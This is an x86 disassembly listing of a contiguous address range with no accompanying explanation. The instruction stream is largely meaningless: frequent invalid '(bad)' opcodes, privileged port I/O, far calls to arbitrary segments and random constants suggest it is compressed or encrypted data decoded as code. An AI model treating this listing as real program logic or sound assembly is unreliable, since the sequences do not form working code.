  42df08:	mov    dl,0x3d
  42df0a:	or     DWORD PTR [bx+0x24b5],esp
  42df0f:	call   0xef3df729
  42df14:	nop
  42df15:	repnz cdq 
  42df17:	xchg   ebx,eax
  42df18:	add    eax,DWORD PTR [edx]
  42df1a:	cld    
  42df1b:	pop    esi
  42df1c:	sti    
  42df1d:	imul   ecx,DWORD PTR [ebx-0x2011feb6],0x44
  42df24:	sub    eax,eax
  42df26:	ja     0x18803150
  42df2c:	pop    ds
  42df2d:	outs   dx,BYTE PTR ds:[esi]
  42df2e:	imul   edx,DWORD PTR [eax+0x7cb31718],0x5ba56d13
  42df38:	shl    DWORD PTR [eax-0x229546be],1
  42df3e:	or     BYTE PTR [edx-0x44],bh
  42df41:	cwde   
  42df42:	add    al,0xff
  42df44:	xchg   edi,eax
  42df45:	es ss stos DWORD PTR es:[edi],eax
  42df48:	aas    
  42df49:	xor    dl,BYTE PTR [ebx+0x16e5a938]
  42df4f:	dec    ecx
  42df50:	outs   dx,BYTE PTR ds:[esi]
  42df51:	and    al,0x29
  42df54:	lds    ebp,FWORD PTR [edx]
  42df56:	sub    bl,BYTE PTR [edx+0x56bf8bf6]
  42df5c:	xor    BYTE PTR [edx+edi*2+0x3273f6fc],dl
  42df63:	sahf   
  42df64:	sub    eax,0x73163486
  42df69:	rol    cl,0x5e
  42df6c:	loopne 0x42dfcb
  42df6e:	mov    ds:0x7082460f,eax
  42df73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df74:	mov    dl,0x4a
  42df76:	xor    DWORD PTR [eax+0x2adfcfe4],edi
  42df7c:	cwde   
  42df7d:	lea    ebx,[ebp+0x0]
  42df80:	adc    eax,esp
  42df82:	adc    al,BYTE PTR [esi-0x44bd778d]
  42df88:	mov    ecx,0xf554a743
  42df8d:	pop    ebx
  42df8e:	fnstsw WORD PTR [edi+0x8f]
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x71]
  42e001:	push   es
  42e002:	or     al,0x49
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xf3000001
  42e00d:	(bad)  
  42e00e:	xlat   BYTE PTR ds:[ebx]
  42e00f:	pop    ebx
  42e010:	push   0x29
  42e012:	dec    eax
  42e013:	enter  0x3ba8,0x43
  42e017:	mov    ds:0xece36a97,eax
  42e01c:	ss inc ecx
  42e01e:	iret   
  42e01f:	cmp    eax,0xbf934319
  42e024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e025:	sub    esp,DWORD PTR [esi-0x15]
  42e028:	shr    BYTE PTR [esi+0x74f860b3],cl
  42e02e:	dec    ebx
  42e02f:	xchg   DWORD PTR [eax+0x0],esp
  42e032:	imul   esp,edx,0x7251473a
  42e038:	out    dx,eax
  42e039:	xchg   BYTE PTR [edx+edi*8-0x13],ah
  42e03d:	adc    esp,edx
  42e03f:	por    mm6,mm4
  42e042:	push   ebp
  42e043:	js     0x42e030
  42e045:	std    
  42e046:	rol    DWORD PTR [ebp+0x4755e09a],cl
  42e04c:	neg    ebp
  42e04e:	mov    dh,0x1f
  42e050:	fsubrp st(1),st
  42e052:	inc    edi
  42e053:	lea    ebx,[edi+0x1ccd2ce7]
  42e059:	mov    bl,0x2b
  42e05b:	sbb    al,0x3
  42e05d:	sub    edi,DWORD PTR [edi-0x739754fe]
  42e063:	push   ebp
  42e064:	ds pusha 
  42e066:	adc    BYTE PTR [edx-0x1],bl
  42e069:	and    eax,0x9e816d15
  42e06f:	sbb    al,0xed
  42e071:	lods   eax,DWORD PTR ds:[esi]
  42e072:	inc    esp
  42e073:	dec    bh
  42e075:	(bad)  
  42e076:	imul   ecx,DWORD PTR [edx],0x0
  42e079:	adc    al,0xab
  42e07b:	test   eax,0xef1150c2
  42e080:	lods   eax,DWORD PTR ds:[esi]
  42e081:	fdiv   DWORD PTR [edx]
  42e083:	addr16 call 0x1f7f:0x3d4c0770
  42e08b:	dec    esp
  42e08c:	jmp    0xfee9d001
  42e091:	jno    0x42e038
  42e093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e094:	lods   eax,DWORD PTR ds:[esi]
  42e095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e096:	dec    edi
  42e097:	xchg   edi,eax
  42e098:	pop    es
  42e099:	bound  ecx,QWORD PTR [edx+0x4e]
  42e09c:	push   0x7c4a5c7f
  42e0a1:	(bad)  
  42e0a3:	aas    
  42e0a4:	xchg   edi,eax
  42e0a5:	(bad)  
  42e0a6:	leave  
  42e0a7:	ret    
  42e0a8:	pop    esi
  42e0a9:	sbb    BYTE PTR [esp+edx*1-0x62],dl
  42e0ad:	icebp  
  42e0ae:	out    dx,eax
  42e0af:	lods   al,BYTE PTR ds:[esi]
  42e0b0:	test   BYTE PTR [eax+0x56],al
  42e0b3:	test   edx,0x52279d37
  42e0b9:	push   ebp
  42e0ba:	add    bl,BYTE PTR [esi]
  42e0bc:	ret    0x24da
  42e0bf:	sbb    BYTE PTR [eax],ch
  42e0c1:	push   edi
  42e0c2:	(bad)  
  42e0c3:	nop
  42e0c4:	jecxz  0x42e0be
  42e0c6:	test   DWORD PTR [edx+0x65],0xdac212b4
  42e0cd:	xor    edi,0x19
  42e0d0:	lods   eax,DWORD PTR ds:[esi]
  42e0d1:	mov    bh,BYTE PTR [edi+0x74]
  42e0d4:	pop    ebp
  42e0d5:	mov    ah,0xe5
  42e0d7:	xor    BYTE PTR [edi+0x22],al
  42e0da:	inc    eax
  42e0db:	gs adc al,0x45
  42e0de:	pop    esp
  42e0df:	mov    eax,0x970fa7b3
  42e0e4:	rcr    dh,0x27
  42e0e7:	call   0xc5de1bd6
  42e0ec:	in     eax,0x9e
  42e0ee:	pop    esp
  42e0ef:	cld    
  42e0f0:	je     0x42e084
  42e0f2:	mov    dl,0x36
  42e0f4:	sahf   
  42e0f5:	mov    eax,0xad0c3a1a
  42e0fa:	call   0xafd0:0xd9e22298
  42e101:	xor    ebx,edi
  42e103:	xor    eax,0x7e64babb
  42e108:	rol    BYTE PTR [ecx-0x1f],cl
  42e10b:	mov    ds:0x931b315e,al
  42e110:	pusha  
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	xchg   BYTE PTR [edi+0x7],al
  42e183:	sub    DWORD PTR [edi-0x12],ecx
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0xa4000001
  42e18d:	aam    0xba
  42e18f:	push   esi
  42e190:	scas   al,BYTE PTR es:[edi]
  42e191:	xor    DWORD PTR [ebx-0x68],ecx
  42e194:	and    dl,cl
  42e196:	jp     0x42e1ec
  42e198:	loop   0x42e150
  42e19a:	lds    ecx,FWORD PTR [ebx-0x294d940c]
  42e1a0:	dec    edx
  42e1a1:	std    
  42e1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1a3:	sub    BYTE PTR [eax],cl
  42e1a5:	adc    al,0xa5
  42e1a7:	cmp    esi,DWORD PTR [edi+0x25]
  42e1aa:	xchg   esi,eax
  42e1ab:	mov    ebx,0xefa1557
  42e1b0:	rcl    esp,cl
  42e1b2:	mov    dh,0xde
  42e1b4:	in     eax,0xf
  42e1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1b7:	mov    bh,0x99
  42e1b9:	dec    eax
  42e1ba:	jge    0x42e16a
  42e1bc:	stos   BYTE PTR es:[edi],al
  42e1bd:	lods   al,BYTE PTR ds:[esi]
  42e1be:	xlat   BYTE PTR ds:[ebx]
  42e1bf:	fist   WORD PTR [ebx-0x7c]
  42e1c2:	pusha  
  42e1c3:	imul   eax,DWORD PTR ss:[edx+esi*4-0x4e],0x8c13e988
  42e1cc:	fwait
  42e1cd:	shr    BYTE PTR [esi+eax*2-0x1f549444],cl
  42e1d4:	add    eax,DWORD PTR [edi+ecx*2-0x2a]
  42e1d8:	xchg   edx,eax
  42e1d9:	sbb    BYTE PTR [ebx-0x61b5f83c],0x84
  42e1e0:	cmp    ebx,eax
  42e1e2:	std    
  42e1e3:	aaa    
  42e1e4:	mov    cl,0x6
  42e1e6:	sbb    al,0x9
  42e1e8:	jle    0x42e25f
  42e1ea:	imul   ebx,esi,0x78359deb
  42e1f0:	xor    bh,0x67
  42e1f3:	out    dx,eax
  42e1f4:	in     eax,dx
  42e1f5:	repz jmp 0x42e201
  42e1f8:	mov    eax,0x2d899ec
  42e1fd:	adc    DWORD PTR [ecx+0x6fc63ea9],edx
  42e203:	cmp    eax,0x960ffdf4
  42e208:	ss dec ebp
  42e20a:	mov    ecx,0xd3c596c1
  42e20f:	pop    ecx
  42e210:	stos   DWORD PTR es:[edi],eax
  42e211:	mov    ebx,0x5da0f765
  42e216:	ficomp DWORD PTR [edi]
  42e218:	sbb    BYTE PTR [eax+eiz*1+0x67199c30],dl
  42e21f:	mov    bh,0xac
  42e221:	mov    edx,0x7ff11306
  42e226:	jl     0x42e21d
  42e228:	je     0x42e252
  42e22a:	or     edx,DWORD PTR [ecx]
  42e22c:	out    0xb2,al
  42e22e:	xchg   ebx,eax
  42e22f:	daa    
  42e230:	sti    
  42e231:	cli    
  42e232:	mov    ds:0xac151435,eax
  42e237:	mov    DWORD PTR [eax+eiz*4+0x58],ebx
  42e23b:	je     0x42e213
  42e23d:	mov    edi,esp
  42e23f:	(bad)  [edx-0x54]
  42e242:	loope  0x42e21a
  42e244:	pop    eax
  42e245:	pusha  
  42e246:	sti    
  42e247:	jae    0x42e231
  42e249:	adc    al,0xfd
  42e24b:	icebp  
  42e24c:	pushf  
  42e24d:	fwait
  42e24e:	ss and eax,0xfcb35c01
  42e254:	xchg   ecx,eax
  42e255:	dec    esp
  42e256:	dec    esi
  42e257:	loope  0x42e2b2
  42e259:	dec    ebx
  42e25a:	fld    QWORD PTR [edx-0x53e273c8]
  42e260:	test   eax,0x6e570c5b
  42e265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e266:	stos   BYTE PTR es:[edi],al
  42e267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e268:	or     ah,BYTE PTR [edx]
  42e26a:	(bad)  [ebx+0x252e51bc]
  42e270:	mov    eax,0x164ebde
  42e275:	and    BYTE PTR [ebx+0xce65973],bh
  42e27b:	adc    dh,bl
  42e27d:	scas   al,BYTE PTR es:[edi]
  42e27e:	lds    ecx,FWORD PTR [esi-0x4a]
  42e281:	aaa    
  42e282:	xchg   esi,eax
  42e283:	aaa    
  42e284:	(bad)  
  42e285:	xchg   ecx,eax
  42e286:	pop    esi
  42e287:	dec    ecx
  42e288:	ret    0x933e
  42e28b:	sti    
  42e28c:	cmp    dl,BYTE PTR [eax+0x222d7c]
	...
  42e2f2:	add    BYTE PTR [eax],al
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x1d199140
  42e301:	mov    cs,WORD PTR [ebx+0x1ef5470]
  42e307:	add    BYTE PTR ds:0xcc000001,al
  42e30d:	push   edi
  42e30e:	dec    edx
  42e30f:	imul   eax,edx,0xd
  42e312:	(bad)  
  42e313:	adc    esi,DWORD PTR [esi]
  42e315:	neg    al
  42e317:	into   
  42e318:	push   ecx
  42e319:	mov    al,0xd0
  42e31b:	pop    eax
  42e31c:	adc    eax,0xfcba3eb0
  42e321:	ret    
  42e322:	dec    ebp
  42e323:	leave  
  42e324:	das    
  42e325:	lds    edi,FWORD PTR [ebp+0x9269dee]
  42e32b:	push   ss
  42e32c:	push   0xffffffef
  42e32e:	add    BYTE PTR [ebx-0x4],ch
  42e331:	jl     0x42e2fa
  42e333:	fwait
  42e334:	sbb    eax,DWORD PTR [edx+edx*2+0x670edcf7]
  42e33b:	add    BYTE PTR [ebx],0xff
  42e33e:	xchg   edx,eax
  42e33f:	pop    esp
  42e340:	mul    DWORD PTR ds:0x1db618e7
  42e346:	ja     0x42e333
  42e348:	shl    BYTE PTR [eax+0x71],cl
  42e34b:	repz mov bh,0xb1
  42e34e:	pop    ecx
  42e34f:	es push 0xffffffe7
  42e352:	and    eax,0x3f242af8
  42e357:	sub    DWORD PTR [ebp-0x1a058c88],edi
  42e35d:	jnp    0x42e334
  42e35f:	mov    ds:0x199cd6f1,eax
  42e364:	sub    al,BYTE PTR ds:0x251f3d2f
  42e36a:	adc    eax,0xf9f6d19c
  42e36f:	xchg   DWORD PTR [ebx],ebp
  42e371:	(bad)  
  42e372:	fstp   DWORD PTR gs:[ecx+0x52d28904]
  42e379:	scas   eax,DWORD PTR es:[edi]
  42e37a:	jno    0x42e386
  42e37c:	push   ebp
  42e37d:	fmul   st,st(0)
  42e37f:	lock cdq 
  42e381:	cmp    al,0x10
  42e383:	sub    ah,BYTE PTR [edi]
  42e385:	push   0x14
  42e387:	xor    eax,0xea6b0cbb
  42e38c:	frstor [edi+0x31b0175]
  42e392:	popa   
  42e393:	(bad)  
  42e394:	jmp    0x322f:0x516e0ee1
  42e39b:	adc    dh,bl
  42e39d:	test   DWORD PTR [ebx-0x54],edx
  42e3a0:	pop    es
  42e3a1:	sar    BYTE PTR [ebx+0x7a1d1b5a],0xd6
  42e3a8:	out    0xe,eax
  42e3aa:	xor    bh,bl
  42e3ac:	push   edi
  42e3ad:	and    eax,0x61b00273
  42e3b2:	xor    DWORD PTR [edx-0x4036987f],ecx
  42e3b8:	not    BYTE PTR [edi*2+0x50fc7eb]
  42e3bf:	out    dx,al
  42e3c0:	outs   dx,BYTE PTR ds:[esi]
  42e3c1:	js     0x42e411
  42e3c3:	sti    
  42e3c4:	scas   al,BYTE PTR es:[edi]
  42e3c5:	lahf   
  42e3c6:	pop    esi
  42e3c7:	icebp  
  42e3c8:	pop    ss
  42e3c9:	jno    0x42e41a
  42e3cb:	mov    eax,0x87bc1ac4
  42e3d0:	or     al,0x3e
  42e3d2:	lods   eax,DWORD PTR ds:[esi]
  42e3d3:	jmp    0x6b2666ff
  42e3d8:	popa   
  42e3d9:	nop
  42e3da:	adc    ebp,DWORD PTR [ecx]
  42e3dc:	je     0x42e400
  42e3de:	jle    0x42e415
  42e3e0:	add    esp,edx
  42e3e2:	cli    
  42e3e3:	dec    esp
  42e3e4:	fbstp  TBYTE PTR cs:[edi-0x3e]
  42e3e8:	fisttp WORD PTR [eax-0x6f]
  42e3eb:	mov    eax,ds:0x46d20be1
  42e3f0:	adc    bl,dl
  42e3f2:	scas   al,BYTE PTR es:[edi]
  42e3f3:	out    dx,al
  42e3f4:	mov    esp,0xa7772be6
  42e3f9:	or     ecx,DWORD PTR [ecx+0x963ffb4]
  42e3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e400:	dec    edi
  42e401:	imul   esp,DWORD PTR [ecx-0x3c618de3],0x38
  42e408:	mov    BYTE PTR [eax-0x3b275515],dh
  42e40e:	inc    ebp
  42e40f:	out    dx,eax
  42e410:	test   BYTE PTR [eax],al
	...
  42e472:	add    BYTE PTR [eax],al
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	in     al,0x41
  42e482:	sbb    DWORD PTR [ecx+ebx*2-0x10],edx
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    eax,0xb2000001
  42e48d:	sub    eax,0x7f6e7b19
  42e492:	pop    ebx
  42e493:	lods   eax,DWORD PTR ds:[esi]
  42e494:	inc    ebx
  42e495:	push   edi
  42e496:	pusha  
  42e497:	call   DWORD PTR [eax+0x7de69e0c]
  42e49d:	inc    esp
  42e49e:	test   eax,0x8ac5cccf
  42e4a3:	or     ecx,esi
  42e4a5:	aam    0xf1
  42e4a7:	cdq    
  42e4a8:	clc    
  42e4a9:	adc    al,0xc9
  42e4ab:	ds aad 0xd8
  42e4ae:	push   esp
  42e4af:	mov    cl,0x20
  42e4b1:	xor    eax,0x2ba8ac1c
  42e4b6:	mov    dl,0x46
  42e4b8:	lods   al,BYTE PTR ds:[esi]
  42e4b9:	enter  0x8a95,0x47
  42e4bd:	(bad)  
  42e4bf:	aas    
  42e4c0:	loope  0x42e442
  42e4c2:	(bad)  
  42e4c3:	add    al,dl
  42e4c5:	fisub  WORD PTR [esi+eax*8-0x5b]
  42e4c9:	stc    
  42e4ca:	lds    ecx,FWORD PTR [edx]
  42e4cc:	xchg   esi,eax
  42e4cd:	xchg   ebx,eax
  42e4ce:	outs   dx,BYTE PTR ds:[esi]
  42e4cf:	jp     0x42e543
  42e4d1:	xor    BYTE PTR [ecx+ecx*1],0xa1
  42e4d5:	pop    edx
  42e4d6:	out    0x5b,al
  42e4d8:	mov    ah,BYTE PTR [edx]
  42e4da:	dec    ebp
  42e4db:	out    dx,eax
  42e4dc:	sbb    eax,0x838250c1
  42e4e1:	stos   DWORD PTR es:[edi],eax
  42e4e2:	sbb    eax,0xd0a9e0bb
  42e4e7:	repz jae 0x42e53f
  42e4ea:	int    0x3c
  42e4ec:	dec    edi
  42e4ed:	push   0x6c
  42e4ef:	add    eax,0x4150e9a9
  42e4f4:	int3   
  42e4f5:	xchg   DWORD PTR [esi+ebx*1-0x71],ebp
  42e4f9:	sub    BYTE PTR [esp+ebp*4+0x20],0xdb
  42e4fe:	outs   dx,BYTE PTR ds:[esi]
  42e4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e500:	sub    bl,BYTE PTR [edi-0xc5891af]
  42e506:	push   esp
  42e507:	test   BYTE PTR [ebx-0x44],al
  42e50a:	pop    eax
  42e50b:	mov    ebx,es
  42e50d:	pop    edi
  42e50e:	out    dx,eax
  42e50f:	call   0x50d7b29b
  42e514:	ret    
  42e515:	and    eax,0x4713dcdc
  42e51a:	stc    
  42e51b:	sub    cl,BYTE PTR [eiz*4-0x554156f5]
  42e522:	pop    ds
  42e523:	dec    ebp
  42e524:	pop    ebp
  42e525:	or     bh,BYTE PTR [esi-0x48ac5c1d]
  42e52b:	ficom  DWORD PTR [esi+ebx*4-0x24affa1e]
  42e532:	stos   BYTE PTR es:[edi],al
  42e533:	arpl   WORD PTR [edx],si
  42e535:	jns    0x42e528
  42e537:	and    eax,0x392d284b
  42e53c:	jle    0x42e581
  42e53e:	jo     0x42e508
  42e540:	sbb    al,0x5a
  42e542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e543:	ins    DWORD PTR es:[edi],dx
  42e544:	test   DWORD PTR [edx+0x36],0xfd92a766
  42e54b:	dec    esp
  42e54c:	mov    edi,0x26214953
  42e551:	push   eax
  42e552:	jge    0x42e578
  42e554:	addr16 lock mov gs:0x1ab3,al
  42e55a:	xchg   bh,cl
  42e55c:	inc    esp
  42e55d:	add    dh,BYTE PTR [ecx]
  42e55f:	mov    esp,0x987c9bc3
  42e564:	mov    ah,0x8
  42e566:	mov    ds:0x5c19e8f4,eax
  42e56b:	sub    dh,ah
  42e56d:	sbb    DWORD PTR [esi+esi*2-0x1a],0xa
  42e572:	dec    ebx
  42e573:	scas   al,BYTE PTR es:[edi]
  42e574:	stc    
  42e575:	dec    BYTE PTR [esi]
  42e577:	aas    
  42e578:	shl    DWORD PTR [ecx],0x3
  42e57b:	ja     0x42e5c1
  42e57d:	not    DWORD PTR [edi]
  42e57f:	xchg   BYTE PTR [ebp-0x219269a8],bh
  42e585:	je     0x42e520
  42e587:	sbb    eax,0x2e72690d
  42e58c:	push   eax
  42e58d:	sub    BYTE PTR [edx-0x64],ah
  42e590:	sbb    eax,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	jmp    0x42e622
  42e602:	arpl   WORD PTR [edx+0x1f15e],sp
  42e608:	add    eax,0x26000001
  42e60d:	adc    DWORD PTR [esi+ebx*2+0x16],edi
  42e611:	jb     0x42e611
  42e613:	push   ebx
  42e614:	mov    ?,WORD PTR [edi]
  42e616:	and    esp,ebp
  42e618:	ss xchg ebx,eax
  42e61a:	inc    edx
  42e61b:	dec    ecx
  42e61c:	out    0x82,eax
  42e61e:	push   ds
  42e61f:	leave  
  42e620:	(bad)  
  42e622:	fcom   QWORD PTR [ecx+0x402207f1]
  42e628:	popa   
  42e629:	cld    
  42e62a:	mov    bh,0x4b
  42e62c:	or     ah,ch
  42e62e:	cmp    BYTE PTR [ebx-0x4925df62],0x42
  42e635:	sbb    DWORD PTR ds:0x9b702e4f,esp
  42e63b:	das    
  42e63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e63d:	add    al,0x12
  42e63f:	icebp  
  42e640:	punpckhwd mm5,QWORD PTR [ebp-0x23a20441]
  42e647:	push   es
  42e648:	inc    ecx
  42e649:	hlt    
  42e64a:	shr    BYTE PTR [eax+esi*2],cl
  42e64d:	sar    DWORD PTR [esi],0xf3
  42e650:	mov    ebp,fs
  42e652:	repnz enter 0x375a,0xe7
  42e657:	cmp    DWORD PTR [eax],edx
  42e659:	inc    ecx
  42e65a:	pop    ss
  42e65b:	add    BYTE PTR [ebp-0x23],ch
  42e65e:	popa   
  42e65f:	dec    ebp
  42e660:	lds    edi,FWORD PTR [ebp-0x6788af29]
  42e666:	add    al,0xb
  42e668:	fs cdq 
  42e66a:	fidivr WORD PTR [edx-0x542ddab0]
  42e670:	jge    0x42e5fb
  42e672:	inc    edx
  42e673:	scas   eax,DWORD PTR es:[edi]
  42e674:	sub    ah,BYTE PTR [edi+0x31ba5c8]
  42e67a:	xor    cl,0x12
  42e67d:	dec    DWORD PTR [ecx]
  42e67f:	popf   
  42e680:	mov    ah,BYTE PTR [eax]
  42e682:	test   BYTE PTR [esi+0x17d6f79e],0xc1
  42e689:	xchg   esp,eax
  42e68a:	cmp    bh,BYTE PTR [edx+0x4f]
  42e68d:	mov    ah,0xb3
  42e68f:	mov    edx,0xf975fcaa
  42e694:	fiadd  DWORD PTR [edx]
  42e696:	popf   
  42e697:	aaa    
  42e698:	shl    esp,cl
  42e69a:	(bad)  
  42e69c:	xlat   BYTE PTR ds:[ebx]
  42e69d:	jns    0x42e69a
  42e69f:	dec    eax
  42e6a0:	push   ecx
  42e6a1:	mov    cl,0xd1
  42e6a3:	les    edi,FWORD PTR [esi+0x3aab7f93]
  42e6a9:	dec    ebx
  42e6aa:	mov    ds,WORD PTR [edi]
  42e6ac:	pop    eax
  42e6ad:	xor    edi,ebx
  42e6af:	loopne 0x42e6cc
  42e6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6b2:	mov    bh,0xbe
  42e6b4:	xor    al,0xa3
  42e6b6:	jne    0x42e6cc
  42e6b8:	cli    
  42e6b9:	mov    al,0x6c
  42e6bb:	stc    
  42e6bc:	sbb    bh,bh
  42e6be:	and    al,BYTE PTR [eax]
  42e6c0:	xchg   DWORD PTR [ecx+0x51],edi
  42e6c3:	std    
  42e6c4:	or     BYTE PTR [esi],bl
  42e6c6:	inc    edi
  42e6c7:	cmc    
  42e6c8:	jne    0x42e678
  42e6ca:	popa   
  42e6cb:	sti    
  42e6cc:	outs   dx,BYTE PTR ds:[esi]
  42e6cd:	or     dl,BYTE PTR [esi]
  42e6cf:	shl    DWORD PTR [edi],1
  42e6d1:	ret    0x263
  42e6d4:	mov    ebx,0x67235562
  42e6d9:	sub    eax,0x7d835162
  42e6de:	adc    eax,0x93c0fb8b
  42e6e3:	xor    ecx,DWORD PTR [edx+0x771a2f6e]
  42e6e9:	mov    ds:0x2676fa5f,eax
  42e6ee:	sub    DWORD PTR [esp+ebp*2],edi
  42e6f1:	stc    
  42e6f2:	push   0xffffffc4
  42e6f4:	jge    0x42e774
  42e6f6:	jb     0x42e6f8
  42e6f8:	dec    eax
  42e6f9:	xchg   edx,eax
  42e6fa:	inc    ebp
  42e6fb:	cmp    BYTE PTR [edi],bl
  42e6fd:	adc    ebx,DWORD PTR [edx+0x69]
  42e700:	xchg   ebp,eax
  42e701:	ror    BYTE PTR [ebp+0x363637fa],1
  42e707:	cli    
  42e708:	dec    edi
  42e709:	inc    ebx
  42e70a:	int3   
  42e70b:	ret    0x9643
  42e70e:	sub    eax,0x3e24
	...
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	fisubr DWORD PTR [eax-0x46]
  42e782:	retf   0x631b
  42e785:	repnz add DWORD PTR [eax],eax
  42e788:	add    eax,0x90000001
  42e78d:	or     ebp,DWORD PTR [ebx]
  42e78f:	mov    dl,BYTE PTR [edx*4-0x7e7d2d15]
  42e796:	mov    ah,0x34
  42e798:	xchg   ecx,eax
  42e799:	cmp    esi,eax
  42e79b:	lds    esi,FWORD PTR [ebp-0xd3f256d]
  42e7a1:	inc    ebp
  42e7a2:	sbb    BYTE PTR [edx],ah
  42e7a4:	in     al,dx
  42e7a5:	pop    ss
  42e7a6:	out    dx,al
  42e7a7:	xor    esp,edx
  42e7a9:	call   0x4956c926
  42e7ae:	les    ebx,FWORD PTR [ebx+0x79]
  42e7b1:	mov    dh,0xbb
  42e7b3:	sbb    DWORD PTR [esi+0x60],ebx
  42e7b6:	dec    eax
  42e7b7:	add    eax,0x5e037201
  42e7bc:	mov    ch,bh
  42e7be:	es aaa 
  42e7c0:	fistp  QWORD PTR [edx]
  42e7c2:	mov    bh,BYTE PTR gs:[ebx+0x594276]
  42e7c9:	mov    DWORD PTR [esi-0x62],ecx
  42e7cc:	inc    edi
  42e7cd:	je     0x42e7b5
  42e7cf:	iret   
  42e7d0:	loop   0x42e75a
  42e7d2:	retf   
  42e7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7d4:	mov    dh,0x50
  42e7d6:	jg     0x42e7da
  42e7d8:	inc    esp
  42e7d9:	pop    edx
  42e7da:	(bad)  
  42e7db:	aam    0x4f
  42e7dd:	mov    BYTE PTR [edx],bl
  42e7df:	aaa    
  42e7e0:	jb     0x42e85e
  42e7e2:	xchg   BYTE PTR [ecx+eax*2-0x4d24a3b2],al
  42e7e9:	xor    al,0xa5
  42e7eb:	jle    0x42e7b2
  42e7ed:	clc    
  42e7ee:	int    0x25
  42e7f0:	sbb    al,0xe
  42e7f2:	das    
  42e7f3:	rcr    BYTE PTR [esi+0x2b5ee101],cl
  42e7f9:	scas   eax,DWORD PTR es:[edi]
  42e7fa:	lahf   
  42e7fb:	xor    dh,BYTE PTR [ecx-0x27]
  42e7fe:	push   ds
  42e7ff:	and    DWORD PTR [edi+0x44],esi
  42e802:	jnp    0x42e792
  42e804:	jge    0x42e7fa
  42e806:	mov    esi,0x80c47f87
  42e80b:	or     al,0x7e
  42e80d:	aad    0x5b
  42e80f:	in     al,0x9e
  42e811:	mov    cs,WORD PTR [ecx+eax*2+0x30]
  42e815:	outs   dx,BYTE PTR ds:[esi]
  42e816:	mov    ds:0x3d2cb691,al
  42e81b:	and    al,0xf3
  42e81d:	fs jg  0x42e80a
  42e820:	push   esp
  42e821:	and    eax,0xe61f7664
  42e826:	mov    esi,0xac90d33d
  42e82b:	loope  0x42e7f6
  42e82d:	pushf  
  42e82e:	mov    bh,0x48
  42e830:	mov    dh,0x24
  42e832:	mov    al,0x9e
  42e834:	xchg   edi,esp
  42e836:	sub    ah,BYTE PTR [eax+0x36]
  42e839:	xchg   esi,eax
  42e83a:	sub    eax,0x6d07ad1e
  42e83f:	mov    ebp,DWORD PTR [ebx]
  42e841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e842:	jb     0x42e898
  42e844:	mov    ebx,0xf4dfbdb6
  42e849:	lock les esi,FWORD PTR [edi]
  42e84c:	call   0xad4ccd5
  42e851:	cmp    bl,BYTE PTR [edi+0x6cf37e7e]
  42e857:	push   eax
  42e858:	call   0x593c:0x831a7cb8
  42e85f:	add    cl,al
  42e861:	xchg   DWORD PTR [edi+edx*1],ecx
  42e864:	arpl   WORD PTR [esp+ebx*8-0x2229cd6b],ax
  42e86b:	rcr    DWORD PTR [ebx],cl
  42e86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e86e:	cs call 0x11865658
  42e874:	stos   BYTE PTR es:[edi],al
  42e875:	fldcw  WORD PTR [esi-0x64]
  42e878:	mov    al,0x91
  42e87a:	sti    
  42e87b:	arpl   cx,ax
  42e87d:	fld    st(3)
  42e87f:	out    dx,eax
  42e880:	mov    cl,0x52
  42e882:	pop    es
  42e883:	mov    ch,0x2a
  42e885:	xor    eax,0xf1716cc2
  42e88a:	(bad)  
  42e88b:	ss popf 
  42e88d:	or     edi,ebp
  42e88f:	leave  
  42e890:	push   0x0
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0xdc07d5]
  42e901:	ret    
  42e902:	stc    
  42e903:	in     eax,0x68
  42e905:	repz add DWORD PTR [eax],eax
  42e908:	add    eax,0xd1000001
  42e90d:	(bad)  
  42e90e:	in     al,dx
